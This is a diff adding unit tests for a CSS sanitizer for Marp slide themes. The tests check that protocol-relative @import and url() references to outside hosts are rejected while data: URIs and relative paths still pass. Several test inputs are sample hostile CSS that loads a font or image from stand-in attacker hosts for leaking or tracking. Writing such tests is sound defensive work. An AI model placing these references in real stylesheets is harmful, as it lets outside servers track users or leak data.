@@ -73,6 +73,35 @@ describe("sanitizeMarpThemeCss", () => {
     const css = `@font-face { font-family: 'X'; src: url(http://attacker.example/leak.woff2); }`;
     assert.equal(sanitizeMarpThemeCss(css).ok, false);
   });
+
+  it("rejects protocol-relative @import url(//host/...)", () => {
+    assert.equal(sanitizeMarpThemeCss(`@import url(//attacker.example/x.css);`).ok, false);
+    assert.equal(sanitizeMarpThemeCss(`@import url("//attacker.example/x.css");`).ok, false);
+    assert.equal(sanitizeMarpThemeCss(`@import url('//attacker.example/x.css');`).ok, false);
+  });
+
+  it("rejects protocol-relative @import bare-string //host/...", () => {
+    assert.equal(sanitizeMarpThemeCss(`@import "//attacker.example/x.css";`).ok, false);
+    assert.equal(sanitizeMarpThemeCss(`@import '//attacker.example/x.css';`).ok, false);
+  });
+
+  it("rejects protocol-relative url(//host/...) in font-face / background", () => {
+    const css = `@font-face { font-family: 'X'; src: url(//attacker.example/leak.woff2); }`;
+    assert.equal(sanitizeMarpThemeCss(css).ok, false);
+    assert.equal(sanitizeMarpThemeCss(`section { background-image: url("//ev.example/track.png"); }`).ok, false);
+  });
+
+  it("does not confuse `//` inside a CSS comment for a protocol", () => {
+    // `// ...` is not CSS comment syntax (block comments use `/* */`),
+    // but the test guards against an over-eager match. A real
+    // sample we want to keep accepting: a CSS line-end `// note`
+    // pseudo-comment would not appear in a parsed sheet anyway —
+    // the surrounding `;` / `}` keeps the engine sane. Here we
+    // assert plain `data:` and relative paths still pass.
+    assert.equal(sanitizeMarpThemeCss(`@font-face { src: url(data:font/woff2;base64,abc); }`).ok, true);
+    assert.equal(sanitizeMarpThemeCss(`section { background-image: url(./bg.png); }`).ok, true);
+    assert.equal(sanitizeMarpThemeCss(`section { background-image: url("../assets/x.svg"); }`).ok, true);
+  });
 });
 
 describe("MARP_HTML_ALLOWLIST", () => {
